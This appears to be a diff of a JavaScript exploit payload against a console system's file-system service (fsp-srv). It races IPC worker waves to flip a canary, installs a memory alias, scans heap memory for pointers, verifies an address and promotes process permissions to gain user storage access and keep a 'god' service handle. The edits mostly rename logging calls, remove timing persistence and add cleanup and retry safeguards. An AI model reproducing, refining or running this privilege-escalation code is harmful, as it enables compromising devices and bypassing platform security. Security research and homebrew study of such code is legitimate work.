-        await emitVerboseStage("Attempt ended after an error; retry checks are incomplete.");
+        await verboseLog("Attempt ended after an error; retry checks are incomplete.");
 
     const completedWithCleanSession = Boolean(
         !executionError &&
@@ -803,34 +478,10 @@ async function runTrackedAttempt(canaryTimingSchedule,
         attemptState.holeCleanupVerified &&
         trackingEnded);
     if (completedWithCleanSession) {
-        if (!timingPersistence?.resetRequested)
-            await clearVisualLog();
-        await emitStage("You just Civ Sevened your machine, congrats");
-        if (timingPersistence?.adjustedThisRun &&
-            !timingPersistence.resetRequested &&
-            !timingPersistence.savedThisRun) {
-            await emitStage("Saving adjusted timings...");
-            const saved = persistTimingScheduleFromFreshSaveHandle(
-                attemptState.canaryTimingSchedule);
-            if (saved.ok) {
-                timingPersistence.savedThisRun = true;
-                timingPersistence.saveError = null;
-                if (saved.cleanupWarning)
-                    await emitVerboseStage("Timing save cleanup: " +
-                        saved.cleanupWarning);
-            } else {
-                timingPersistence.saveError = saved.error;
-                await emitStage("Could not save adjusted timings (" +
-                    saved.error + "); keeping them for this run.");
-                if (saved.cleanupWarning)
-                    await emitVerboseStage("Timing save cleanup: " +
-                        saved.cleanupWarning);
-            }
-        }
-        for (const line of formatFinalTimingSchedule(
-            attemptState.canaryTimingSchedule, timingPersistence)) {
-            await emitStage(line);
-        }
+        await clearVisualLog();
+        await log("You just Civ Sevened your machine, congrats");
+        await log("Cleanup verified: the god fsp-srv handle and its " +
+            "storage remain.");
     }
 
     return attemptState;
@@ -841,27 +492,8 @@ async function runTrackedAttempt(canaryTimingSchedule,
 // Main payload (single attempt)
 // ---------------------------------------------------------------------------
 
-async function runPayload(attemptState, allowTimingAdjustments = true,
-    timingPersistence = null) {
+async function runPayload(attemptState, runControl = null) {
     const config = createFspIdentityConfig();
-    const timingBaseline = {
-        roleDelays: config.roleDelays.slice(),
-        guardDelays: config.guardDelays.slice()
-    };
-    const carriedSchedule = copyCanaryTimingSchedule(
-        attemptState.canaryTimingSchedule);
-    if (!timingPersistence?.useDefaultsThisAttempt && carriedSchedule &&
-        carriedSchedule.roleDelays.length === config.roleDelays.length &&
-        carriedSchedule.guardDelays.length === config.guardDelays.length &&
-        carriedSchedule.baselineRoleDelays.length === config.roleDelays.length &&
-        carriedSchedule.baselineGuardDelays.length === config.guardDelays.length) {
-        config.roleDelays.splice(0, config.roleDelays.length,
-            ...carriedSchedule.roleDelays);
-        config.guardDelays.splice(0, config.guardDelays.length,
-            ...carriedSchedule.guardDelays);
-        timingBaseline.roleDelays = carriedSchedule.baselineRoleDelays;
-        timingBaseline.guardDelays = carriedSchedule.baselineGuardDelays;
-    }
     const helpers = createFspIdentityHelpers({
         optimizeRootCandidateScan: true,
         collectRootScanTiming: true
@@ -869,26 +501,26 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
 
     if (typeof checkWindow !== "function" ||
         typeof extractRoleTimings !== "function") {
-        await emitStage("Timing support is unavailable. Stopping.");
+        await log("Timing support is unavailable. Stopping.");
         return;
     }
 
     // -- Phase 1: FSP and save resources --------------------------------
 
-    await emitStage("Preparing file-system access and save data...");
+    await log("Preparing file-system access and save data...");
 
     const schedulingResult = await borrowRawThreadScheduling();
     if (!schedulingResult?.ok) {
-        await emitStage("Could not prepare worker scheduling.");
-        await emitVerboseStage(formatFailureSuffix(schedulingResult));
+        await log("Could not prepare worker scheduling.");
+        await verboseLog(formatFailureSuffix(schedulingResult));
         return;
     }
     const {rawScheduling} = schedulingResult;
 
     const sessionSetup = await openFspSessions({helpers});
     if (!sessionSetup?.ok) {
-        await emitStage("Could not open the required file systems.");
-        await emitVerboseStage(formatFailureSuffix(sessionSetup));
+        await log("Could not open the required file systems.");
+        await verboseLog(formatFailureSuffix(sessionSetup));
         return;
     }
 
@@ -897,59 +529,19 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
     attemptState.holeCleanupHandle = handles.temporaryHandle || 0;
 
     if (!attemptState.holeCleanupHandle) {
-        await emitStage("Cleanup access is unavailable. Stopping safely.");
+        await log("Cleanup access is unavailable. Stopping safely.");
         await beginCleanupLog(attemptState);
         helpers.cleanup(handles);
         return;
     }
 
-    if (timingPersistence && !timingPersistence.checked) {
-        timingPersistence.checked = true;
-        if (timingPersistence.useDefaultsThisAttempt) {
-            const defaults = createFspIdentityConfig();
-            config.roleDelays.splice(0, config.roleDelays.length,
-                ...defaults.roleDelays);
-            config.guardDelays.splice(0, config.guardDelays.length,
-                ...defaults.guardDelays);
-            timingBaseline.roleDelays = defaults.roleDelays.slice();
-            timingBaseline.guardDelays = defaults.guardDelays.slice();
-            attemptState.canaryTimingSchedule = {
-                roleDelays: defaults.roleDelays.slice(),
-                guardDelays: defaults.guardDelays.slice(),
-                baselineRoleDelays: defaults.roleDelays.slice(),
-                baselineGuardDelays: defaults.guardDelays.slice()
-            };
-            await emitStage("X reset requested before timing load; using built-in timings.");
-        } else {
-            const timingLoad = loadTimingScheduleFromSave(handles.savedHandle);
-            if (timingLoad.status === "loaded") {
-                config.roleDelays.splice(0, config.roleDelays.length,
-                    ...timingLoad.schedule.roleDelays);
-                config.guardDelays.splice(0, config.guardDelays.length,
-                    ...timingLoad.schedule.guardDelays);
-                attemptState.canaryTimingSchedule = {
-                    roleDelays: timingLoad.schedule.roleDelays.slice(),
-                    guardDelays: timingLoad.schedule.guardDelays.slice(),
-                    baselineRoleDelays: timingBaseline.roleDelays.slice(),
-                    baselineGuardDelays: timingBaseline.guardDelays.slice()
-                };
-                timingPersistence.loaded = true;
-                await emitStage("Loaded saved timings from " +
-                    TIMING_SAVE_DISPLAY_PATH + ".");
-            } else if (timingLoad.status === "missing") {
-                await emitStage("No saved timing file found; using built-in timings.");
-            } else {
-                await emitStage("Could not load saved timings; using built-in timings.");
-                if (timingLoad.detail)
-                    await emitVerboseStage("Timing load: " + timingLoad.detail);
-            }
-        }
-    }
-
     const {pktBuf} = sessionSetup;
     var heapBaseline = readAllocationCounters(handles.rootSession, pktBuf);
-    await emitStage("Heap baseline: counter5=0x" +
+    await log("Heap baseline: counter5=0x" +
         (heapBaseline ? heapBaseline[5].toString(16) : "unavailable"));
+    await verboseLog("Heap baseline counters: " + (heapBaseline
+        ? heapBaseline.map(value => value.toString(16)).join(",")
+        : "unavailable"));
 
     const scratch = await createScratchTree({
         config, helpers,
@@ -958,8 +550,8 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
         handleResources: handles
     });
     if (!scratch?.ok) {
-        await emitStage("Could not prepare temporary save data.");
-        await emitVerboseStage(formatFailureSuffix(scratch));
+        await log("Could not prepare temporary save data.");
+        await verboseLog(formatFailureSuffix(scratch));
         return;
     }
 
@@ -972,8 +564,8 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
     const stopAndCleanup = async options => {
         cleanupAttempted = true;
         await beginCleanupLog(attemptState);
-        // Cleanup may itself launch cache-retirement waves. If that throws,
-        // keep the allocation scope alive because a worker may still use it.
+        // If cleanup throws while a worker may still use its buffers, keep
+        // the allocation scope alive for the guarded fallback cleanup.
         attemptState.workersQuiesced = false;
         const cleanupOptions = {...options,
             dirtyFileSize: config.DIRTY_FILE_SIZE,
@@ -999,8 +591,8 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
     });
     if (!storageSetup?.ok) {
         cleanupAttempted = true;
-        await emitStage("Could not prepare storage access.");
-        await emitVerboseStage(formatFailureSuffix(storageSetup));
+        await log("Could not prepare storage access.");
+        await verboseLog(formatFailureSuffix(storageSetup));
         return;
     }
     handles = {...handles, ...storageSetup};
@@ -1013,24 +605,24 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
     });
     if (!triggerSetup?.ok) {
         cleanupAttempted = true;
-        await emitStage("Could not prepare file handles.");
-        await emitVerboseStage(formatFailureSuffix(triggerSetup));
+        await log("Could not prepare file handles.");
+        await verboseLog(formatFailureSuffix(triggerSetup));
         return;
     }
     handles = {...handles, ...triggerSetup};
 
-    await emitStage("File-system access and save data are ready.");
+    await log("File-system access and save data are ready.");
 
     // -- Phase 3: IPC requests and workers ------------------------------
 
-    await emitStage("Preparing workers...");
+    await log("Preparing workers...");
 
     const buffers = allocatePacketBuffers({
         config, SCRATCH_DIR: scratch.SCRATCH_DIR,
         canaryPath: scratch.canaryPath
     });
     if (!buffers?.ok) {
-        await emitStage("Could not prepare worker buffers.");
+        await log("Could not prepare worker buffers.");
         return;
     }
     const renamePathBuffers = {
@@ -1056,12 +648,12 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
         triggerBuf: buffers.triggerBuf
     });
     if (!packets?.ok) {
-        await emitStage("Could not prepare worker requests.");
+        await log("Could not prepare worker requests.");
         return;
     }
 
     const pathPair = await checkPathPair({
-        helpers, SCRATCH_DIR: scratch.SCRATCH_DIR,
+        config, helpers, SCRATCH_DIR: scratch.SCRATCH_DIR,
         fillerDst: buffers.fillerDst, fillerSrc: buffers.fillerSrc,
         guardPath: buffers.guardPath, guardPathC: buffers.guardPathC,
         rootSession: handles.rootSession,
@@ -1070,8 +662,8 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
     });
     if (!pathPair?.ok) {
         cleanupAttempted = true;
-        await emitStage("Could not prepare auxiliary storage.");
-        await emitVerboseStage(formatFailureSuffix(pathPair));
+        await log("Could not prepare auxiliary storage.");
+        await verboseLog(formatFailureSuffix(pathPair));
         return;
     }
     handles = {...handles, ...pathPair};
@@ -1081,7 +673,7 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
         pinPkt: packets.pinPkt, prePkt: packets.prePkt
     });
     if (!cmifSetup?.ok) {
-        await emitStage("Could not prepare worker requests.");
+        await log("Could not prepare worker requests.");
         return;
     }
 
@@ -1096,15 +688,15 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
         triggerHandle: handles.triggerHandle
     });
     if (!waveInfrastructure?.ok) {
-        await emitStage("Could not start the workers.");
+        await log("Could not start the workers.");
         return;
     }
 
-    await emitStage("Workers are ready.");
+    await log("Workers are ready.");
 
     // -- Phase 4: canary attempt -----------------------------------------
 
-    await emitStage("Checking the canary window...");
+    await log("Checking the canary window...");
     cleanupWorkerStateSafe = false;
 
     const control = await runControlWaveLoop({
@@ -1136,24 +728,17 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
         setupPath: scratch.setupPath, setupPkt: scratch.setupPkt,
         triggerBuf: buffers.triggerBuf,
         renamePathBuffers,
-        timingBaseline,
-        allowTimingAdjustments,
-        shouldStop: () => timingPersistence?.stopRequested === true
+        shouldStop: () => runControl?.stopRequested === true,
+        deferredVerboseLines: runControl?.deferredWaveLogLines,
+        attemptNumber: runControl?.currentAttempt
     });
 
     cleanupWorkerStateSafe = control?.workerStateSafe === true;
     attemptState.stoppedByUser = control?.stoppedByUser === true;
     attemptState.positiveAttempts = control?.positiveAttempts || 0;
     attemptState.positiveWindows = control?.positiveWindows || 0;
-    attemptState.timingAdjustments = control?.timingAdjustments || [];
-    attemptState.canaryTimingSchedule = copyCanaryTimingSchedule(
-        control?.timingSchedule) || attemptState.canaryTimingSchedule;
-    const hasTimingAdjustment = Boolean(control?.timingAdjustments?.length);
-    if (hasTimingAdjustment && timingPersistence) {
-        timingPersistence.adjustedThisRun = true;
-        timingPersistence.savedThisRun = false;
-        timingPersistence.saveError = null;
-    }
+    attemptState.qualifiedCanaryFlips =
+        control?.positiveQualifiedFlips || 0;
     let canaryStageMessage;
     if (control?.stoppedByUser) {
         canaryStageMessage = "Stopped by user after the current wave; no further waves will launch.";
@@ -1161,20 +746,12 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
         canaryStageMessage = "CANARY FLIPPED";
     } else if (control?.positiveWindows) {
         canaryStageMessage = "Canary did not flip.";
-        if (hasTimingAdjustment) {
-            canaryStageMessage +=
-                " Timing will be adjusted for the next attempt.";
-        }
     } else {
         canaryStageMessage = "No valid canary window was found.";
-        if (hasTimingAdjustment) {
-            canaryStageMessage +=
-                " Timing will be adjusted for the next attempt.";
-        }
     }
 
-    await emitStage(canaryStageMessage);
-    await emitVerboseStage(formatCanaryResult(control, config));
+    await log(canaryStageMessage);
+    await verboseLog(formatCanaryResult(control, config));
     handles = {...handles, pinHandle: control?.pinHandle || handles.pinHandle};
 
     if (control?.stoppedByUser) {
@@ -1196,6 +773,19 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
         return;
     }
 
+    if (config.CANARY_BENCH_MODE && control.canaryQualified === true) {
+        await log("CANARY BENCH: qualified flip achieved; " +
+            "skipping candidate storage, alias and promotion for this " +
+            "attempt.");
+        await stopAndCleanup({
+            reason: "Canary bench mode; qualified flip achieved; " +
+                "skipping candidate storage, cache alias and promotion.",
+            scratch, handles, helpers,
+            workerStateSafe: control.workerStateSafe
+        });
+        return;
+    }
+
     if (control.canaryQualified !== true) {
         await stopAndCleanup({
             reason: "Canary did not flip; skipping candidate storage, " +
@@ -1208,25 +798,28 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
 
     // -- Phase 5: candidate storage -------------------------------------
 
-    await emitStage("Preparing candidate storage...");
+    await log("Preparing candidate storage...");
 
     const candidateSetup = await preparePostCanaryCandidate({
         config, helpers, canaryQualified: control.canaryQualified,
         pktBuf: pktBuf,
         rootSession: handles.rootSession,
         storageHandle: handles.storageHandle,
-        workerStateSafe: control.workerStateSafe
+        workerStateSafe: control.workerStateSafe,
+        usePreReservation: attemptState.usePreReservation
     });
+    attemptState.preReservationTested =
+        attemptState.usePreReservation === true;
 
     if (candidateSetup?.candidateHandle && candidateSetup?.primeHex &&
         !candidateSetup?.failureReason) {
-        await emitStage("CANDIDATE STORAGE IS READY");
+        await log("CANDIDATE STORAGE IS READY");
     } else if (candidateSetup?.candidateHandle && candidateSetup?.primeHex) {
-        await emitStage("Candidate storage verification failed.");
+        await log("Candidate storage verification failed.");
     } else {
-        await emitStage("Candidate storage is unavailable.");
+        await log("Candidate storage is unavailable.");
     }
-    await emitVerboseStage("Candidate storage: " +
+    await verboseLog("Candidate storage: " +
         (candidateSetup?.failureReason || "verified"));
 
     handles = {...handles, candidateHandle: candidateSetup?.candidateHandle || 0};
@@ -1249,7 +842,7 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
     var aliasHeapCounter5 = aliasHeapCounters ? aliasHeapCounters[5] : null;
     var aliasHeapDelta = aliasHeapCounter5 !== null && heapBaseline
         ? aliasHeapCounter5 - heapBaseline[5] : null;
-    await emitStage("Heap before memory alias: counter5=" +
+    await log("Heap before memory alias: counter5=" +
         (aliasHeapCounter5 !== null
             ? "0x" + aliasHeapCounter5.toString(16) : "unavailable") +
         "; delta-vs-attempt-start=" +
@@ -1257,7 +850,7 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
             (aliasHeapDelta < 0 ? "-0x" + (-aliasHeapDelta).toString(16)
                 : "+0x" + aliasHeapDelta.toString(16))));
 
-    await emitStage("Installing the memory alias...");
+    await log("Installing the memory alias...");
     const aliasStartedAt = Date.now();
     cleanupWorkerStateSafe = false;
     attemptState.candidateCacheRetirementRequired = true;
@@ -1267,6 +860,7 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
         config, helpers, REQ: packets.REQ,
         canaryQualified: candidateSetup.canaryQualified,
         candidateHandle: candidateSetup.candidateHandle,
+        preGroup: candidateSetup.preGroup,
         dirtyFilePath: scratch.dirtyFilePath,
         dirtyWriteBuf: control.dirtyWriteBuf,
         dirtyWritePkt: control.dirtyWritePkt,
@@ -1295,18 +889,18 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
         setupPath: scratch.setupPath, setupPkt: scratch.setupPkt,
         triggerBuf: buffers.triggerBuf,
         renamePathBuffers,
-        reportProgress: emitStage,
-        shouldStop: () => timingPersistence?.stopRequested === true
+        reportProgress: log,
+        shouldStop: () => runControl?.stopRequested === true
     });
 
     cleanupWorkerStateSafe = alias?.workerStateSafe === true;
     const aliasElapsedMs = Date.now() - aliasStartedAt;
-    await emitStage(alias?.aliasInstalled
+    await log(alias?.aliasInstalled
         ? "MEMORY ALIAS INSTALLED"
         : alias?.copyStepsCompleted
             ? "Memory alias installation is incomplete."
             : "Memory alias could not be installed.");
-    await emitVerboseStage(formatAliasResult(alias) +
+    await verboseLog(formatAliasResult(alias) +
         formatAliasTiming(alias, aliasElapsedMs));
 
     const analysisResources = {
@@ -1354,7 +948,7 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
         analysis: analysisResources
     };
 
-    if (alias?.stoppedByUser || timingPersistence?.stopRequested) {
+    if (alias?.stoppedByUser || runControl?.stopRequested) {
         attemptState.stoppedByUser = true;
         await stopAndCleanup({
             reason: "Stopped by user during memory alias after the current wave; " +
@@ -1365,6 +959,38 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
             workerStateSafe: alias?.workerStateSafe === true
         });
         return;
+    }
+
+    if (alias?.aliasInstalled) {
+        const aliasReadback = helpers.inspectCandidateCacheAlias(
+            handles.candidateHandle, {
+                config,
+                aliasControlHex: candidateSetup.aliasControlHex,
+                primeHex: candidateSetup.primeHex
+            });
+        await verboseLog("Cache alias readback=" + aliasReadback.state +
+            (aliasReadback.readbackHex
+                ? " · bytes=" + aliasReadback.readbackHex : "") +
+            (aliasReadback.detail
+                ? " · " + aliasReadback.detail : ""));
+
+        if (aliasReadback.state !== "aliased") {
+            await log("Cache alias readback is " + aliasReadback.state +
+                "; memory search is skipped.");
+            if (aliasReadback.state === "original" &&
+                !attemptState.usePreReservation) {
+                attemptState.retryWithPreReservation = true;
+            }
+            await stopAndCleanup({
+                reason: "Cache copy waves completed, but candidate readback " +
+                    "did not confirm the alias.",
+                scratch, handles, helpers, addressCopy,
+                candidateCacheNeedsRetirement:
+                    Boolean(alias?.candidateCacheNeedsRetirement),
+                workerStateSafe: alias?.workerStateSafe === true
+            });
+            return;
+        }
     }
 
     if (!alias?.ok || !alias.aliasInstalled) {
@@ -1381,7 +1007,7 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
 
     // -- Phase 7: heap neighbors and pointer scan -----------------------
 
-    await emitStage("Preparing memory search...");
+    await log("Preparing memory search...");
 
     const releaseSetup = await prepareReleaseNeighbors({
         aliasInstalled: alias.aliasInstalled,
@@ -1391,7 +1017,7 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
     });
 
     if (!releaseSetup?.ok) {
-        await emitStage("Could not prepare memory search.");
+        await log("Could not prepare memory search.");
         await stopAndCleanup({
             reason: "Neighbor storage setup failed; " +
                 "skipping heap and address scans.",
@@ -1406,13 +1032,13 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
     handles = {...handles, extraStorages: releaseSetup.extraStorages || []};
 
     if (releaseSetup.eligible) {
-        await emitStage("Memory search is ready.");
-        await emitVerboseStage(releaseSetup.extraStorages.length + "/" +
+        await log("Memory search is ready.");
+        await verboseLog(releaseSetup.extraStorages.length + "/" +
             releaseSetup.expectedStorages + " storages prepared (attempted=" +
             releaseSetup.attemptedStorages + "; stopped=" +
             (releaseSetup.failureReason || "no") + ").");
     } else {
-        await emitStage("Memory search is unavailable.");
+        await log("Memory search is unavailable.");
         await stopAndCleanup({
             reason: "Neighbor scan is ineligible; skipping heap snapshot, " +
                 "pointer search, address qualification and promotion.",
@@ -1434,23 +1060,35 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
     };
 
     if (releaseSetup.eligible) {
-        await emitStage("Capturing a memory snapshot...");
+        await log("Capturing a memory snapshot...");
         baseline = await captureReleaseBaseline({
             config, candidateHandle: handles.candidateHandle,
             primeHex: candidateSetup.primeHex, helpers
         });
 
         if (baseline?.snapshotOk) {
-            await emitStage("Memory snapshot captured.");
+            await log("Memory snapshot captured.");
         } else {
-            await emitStage("Memory snapshot could not be verified.");
-            await emitVerboseStage("Snapshot details: read=" +
+            await log("Memory snapshot could not be verified.");
+            await verboseLog("Snapshot details: read=" +
                 formatCode(baseline?.readError) + "; prefixMatched=" +
                 Boolean(baseline?.prefixMatches) + "; dataBytes=" +
                 (baseline?.prevEnd || 0) + ").");
+            if (!attemptState.usePreReservation) {
+                attemptState.retryWithPreReservation = true;
+            }
+            await stopAndCleanup({
+                reason: "The memory snapshot did not pass its readback checks; " +
+                    "skipping the memory scan.",
+                scratch, handles, helpers, addressCopy,
+                candidateCacheNeedsRetirement:
+                    Boolean(alias.candidateCacheNeedsRetirement),
+                workerStateSafe: addressCopy.workerStateSafe
+            });
+            return;
         }
 
-        await emitStage("Searching memory for candidates...");
+        await log("Searching memory for candidates...");
         release = await releaseNeighborsAndFindPointers({
             config, candidateHandle: handles.candidateHandle,
             primeHex: candidateSetup.primeHex,
@@ -1459,21 +1097,21 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
         });
 
         if (!release?.ok) {
-            await emitStage("Memory search failed.");
-            await emitVerboseStage("Memory search stopped: " +
+            await log("Memory search failed.");
+            await verboseLog("Memory search stopped: " +
                 (release?.stopReason || "unknown") + ".");
         } else if (release.stopReason === "baseline-not-qualified") {
-            await emitStage("Memory search skipped because the snapshot was not verified.");
+            await log("Memory search skipped because the snapshot was not verified.");
         } else if (release.pointerCandidates.length) {
-            await emitStage("Memory candidates found.");
-            await emitVerboseStage(release.pointerCandidates.length +
+            await log("Memory candidates found.");
+            await verboseLog(release.pointerCandidates.length +
                 " candidates found across " + release.releaseRounds +
                 " rounds" + (release.monitoringRounds
                     ? " + " + release.monitoringRounds + " monitor" : "") +
                 " (changed links=" + release.totalChangedLinks +").");
         } else {
-            await emitStage("No memory candidates were found.");
-            await emitVerboseStage("Memory search details: rounds=" +
+            await log("No memory candidates were found.");
+            await verboseLog("Memory search details: rounds=" +
                 release.releaseRounds +
                 (release.monitoringRounds
                     ? " + " + release.monitoringRounds + " monitor" : "") +
@@ -1483,7 +1121,7 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
                 (release.readError == null ? "none" : formatCode(release.readError)) + ".");
         }
     } else {
-        await emitStage("Memory search was skipped.");
+        await log("Memory search was skipped.");
     }
 
     handles = {...handles,
@@ -1514,7 +1152,7 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
 
     // -- Phase 8: address qualification ---------------------------------
 
-    await emitStage("Verifying the memory address...");
+    await log("Verifying the memory address...");
     const addressStartedAt = Date.now();
     cleanupWorkerStateSafe = false;
 
@@ -1524,7 +1162,7 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
         candidateHandle: handles.candidateHandle,
         collectTimingProfile: true,
         reportProgress: reportAddressProgress,
-        shouldStop: () => timingPersistence?.stopRequested === true,
+        shouldStop: () => runControl?.stopRequested === true,
         pointerCandidates: release.pointerCandidates,
         primeHex: candidateSetup.primeHex,
         rootSession: handles.rootSession,
@@ -1540,7 +1178,7 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
         address.rootStageVerified && address.verifiedIdentityTargets &&
         address.addressPlan && address.domainSession);
     if (addressReadyForPromotion) {
-        await emitStage("MEMORY ADDRESS VERIFIED");
+        await log("MEMORY ADDRESS VERIFIED");
     } else {
         const missingChecks = [];
         if (!address?.ok) missingChecks.push("qualification result");
@@ -1556,17 +1194,17 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
             : "required checks did not pass";
         const detail = typeof address?.addressFailureDetail === "string"
             ? address.addressFailureDetail.slice(0, 160) : "";
-        await emitStage("Memory address not ready for promotion: " + reason +
+        await log("Memory address not ready for promotion: " + reason +
             "; missing=" + missingChecks.join(", ") +
             (detail ? "; detail=" + detail : "") + ".");
     }
     for (const message of formatAddressResults(address, addressElapsedMs))
-        await emitVerboseStage(message);
+        await verboseLog(message);
 
     handles = {...handles, domainSession: address.domainSession};
     addressCopy = address?.addressCopy || addressCopy;
 
-    if (timingPersistence?.stopRequested) {
+    if (runControl?.stopRequested) {
         attemptState.stoppedByUser = true;
         await stopAndCleanup({
             reason: "Stopped by user during address qualification after the " +
@@ -1595,7 +1233,7 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
 
     // -- Phase 9: PID promotion -----------------------------------------
 
-    await emitStage("Checking access to user storage...");
+    await log("Checking access to user storage...");
     cleanupWorkerStateSafe = false;
 
     const promotion = await runPromotionStep({
@@ -1626,10 +1264,10 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
         promotionOutcome.contentFsDomainObjectClosed !== false);
     attemptState.promotionRestored = promotion?.promotionRestored === true;
 
-    await emitStage(attemptState.permissionProven
+    await log(attemptState.permissionProven
         ? "USER STORAGE ACCESS VERIFIED"
         : "User storage access was not verified.");
-    await emitVerboseStage(formatPromotionResult(promotion, address, handles));
+    await verboseLog(formatPromotionResult(promotion, address, handles));
 
     if (promotionOutcome.promotionRetained) {
         await beginCleanupLog(attemptState);
@@ -1654,7 +1292,8 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
             temporaryHandle: 0,
             triggerHandle: handles.triggerHandle,
             workerStateSafe: promotion.workerStateSafe,
-            dirtyFileSize: config.DIRTY_FILE_SIZE
+            dirtyFileSize: config.DIRTY_FILE_SIZE,
+            dirtyFilePath: scratch.dirtyFilePath
         });
 
         attemptState.promotionRetained = true;
@@ -1679,7 +1318,7 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
         attemptState.cleanupSummary =
             "fspSrv and candidate storage intentionally retained";
         cleanupWorkerStateSafe = lightCleanup.workerStateSafe;
-        await emitVerboseStage(formatCleanupResult(lightCleanup,
+        await verboseLog(formatCleanupResult(lightCleanup,
             lightCleanup.workerStateSafe));
         return;
     }
@@ -1697,6 +1336,7 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
                 (promotion.addressCopy || address.addressCopy)
                     .candidateCacheNeedsRetirement),
         candidateHandle: handles.candidateHandle,
+        rootSession: handles.rootSession,
         retireRetainedEndpoint: promotion.retireRetainedEndpoint,
         workerStateSafe: promotion.workerStateSafe
     });
@@ -1707,7 +1347,7 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
 
     cleanupWorkerStateSafe = retired?.workerStateSafe === true;
     addressCopy = retired?.addressCopy || addressCopy;
-    await emitVerboseStage(formatRetirementResult(retired));
+    await verboseLog(formatRetirementResult(retired));
     handles = {...handles, candidateHandle: retired.candidateHandle};
 
     cleanupAttempted = true;
@@ -1733,10 +1373,11 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
         temporaryHandle: 0,
         triggerHandle: handles.triggerHandle,
         workerStateSafe: retired.workerStateSafe,
-        dirtyFileSize: config.DIRTY_FILE_SIZE
+        dirtyFileSize: config.DIRTY_FILE_SIZE,
+        dirtyFilePath: scratch.dirtyFilePath
     });
 
-    await emitVerboseStage(formatCleanupResult(cleanup, retired.workerStateSafe));
+    await verboseLog(formatCleanupResult(cleanup, retired.workerStateSafe));
     recordCleanupState(attemptState, {retired, cleanup},
         retired.workerStateSafe,
         Boolean(retired.addressCopy?.candidateCacheNeedsRetirement));
@@ -1769,7 +1410,7 @@ async function performStopAndCleanup({
     domainSession = null,
     dirtyFileSize = 0
 }) {
-    await emitVerboseStage("Stopping reason: " + reason);
+    await verboseLog("Stopping reason: " + reason);
 
     // Retire the candidate cache if a handle is still open
     let retired = {
@@ -1787,10 +1428,11 @@ async function performStopAndCleanup({
                 candidateCacheNeedsRetirement ||
                 Boolean(addressCopy?.candidateCacheNeedsRetirement),
             candidateHandle: retired.candidateHandle,
+            rootSession: handles?.rootSession || 0,
             retireRetainedEndpoint: null,
             workerStateSafe: Boolean(workerStateSafe)
         });
-        await emitVerboseStage(formatRetirementResult(retired));
+        await verboseLog(formatRetirementResult(retired));
     }
 
     // Delete save:/hole and close remaining handles
@@ -1820,10 +1462,11 @@ async function performStopAndCleanup({
             ? 0 : handles?.temporaryHandle || 0,
         triggerHandle: handles?.triggerHandle || 0,
         workerStateSafe: finalWorkerStateSafe,
-        dirtyFileSize
+        dirtyFileSize,
+        dirtyFilePath: scratch?.dirtyFilePath || ""
     });
 
-    await emitVerboseStage(formatCleanupResult(cleanup, finalWorkerStateSafe));
+    await verboseLog(formatCleanupResult(cleanup, finalWorkerStateSafe));
     return {retired, cleanup};
 }
 
@@ -1910,11 +1553,28 @@ function readEntryTypeChecked(handle, path) {
 // ---------------------------------------------------------------------------
 
 async function runHoleCleanupHandler(attemptState) {
+    const cacheRetirementUnverified =
+        attemptState.candidateCacheRetirementRequired &&
+        !attemptState.cacheRetirementVerified &&
+        !attemptState.retainedEndpointActive;
+
+    if (cacheRetirementUnverified) {
+        attemptState.holeAbsentVerified = false;
+        attemptState.holeCleanupVerified = false;
+        attemptState.holeCleanupDeferred = true;
+        attemptState.safeToRetry = false;
+        await log("Candidate cache retirement is unverified. " +
+            "Skipped /hole cleanup; hard reboot required.");
+        await verboseLog("HOLE FALLBACK: skipped before filesystem IPC; " +
+            "the fallback save handle is left untouched until reboot.");
+        return false;
+    }
+
     const handle = attemptState.holeCleanupHandle;
     if (!handle) {
         attemptState.holeAbsentVerified = false;
         attemptState.holeCleanupVerified = false;
-        await emitVerboseStage(
+        await verboseLog(
             "HOLE FALLBACK: no independent save handle; " +
             "absence cannot be verified.");
         return false;
@@ -1930,7 +1590,7 @@ async function runHoleCleanupHandler(attemptState) {
     let absenceVerifiedByPrimary = false;
 
     try {
-        await emitVerboseStage(
+        await verboseLog(
             "HOLE FALLBACK: checking /hole on the reserved " +
             "temporary save handle.");
 
@@ -2046,7 +1706,7 @@ async function runHoleCleanupHandler(attemptState) {
         commitText = "not-needed";
     }
 
-    await emitVerboseStage(
+    await verboseLog(
         "HOLE FALLBACK: initial=" + initialText +
         "; delete=" + (deletion
             ? formatCode(deletion.transport) + "/" +
